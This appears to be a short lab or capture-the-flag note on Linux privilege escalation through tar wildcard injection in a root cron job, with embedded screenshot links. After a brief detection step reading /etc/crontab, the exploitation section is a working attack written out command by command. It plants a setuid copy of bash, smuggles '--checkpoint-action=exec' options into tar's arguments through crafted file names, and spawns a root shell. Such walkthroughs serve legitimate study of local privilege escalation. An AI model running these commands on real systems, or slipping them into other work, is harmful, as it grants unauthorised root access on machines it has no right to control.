# Detection
---
- `cat /etc/crontab`
	- ![[Pasted image 20250430151627.png]]
- ![[Pasted image 20250430151653.png]]

# Exploitation
---
- `cat /usr/local/bin/compress.sh`
	- ![[Pasted image 20250430152724.png]]
- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`
- `chmod +x runme.sh`
- `echo "" > '--checkpoint=1'`
- `echo "" > '--checkpoint-action=exec=sh runme.sh'`
- `/tmp/bash -p`
	- ![[Pasted image 20250430154614.png]]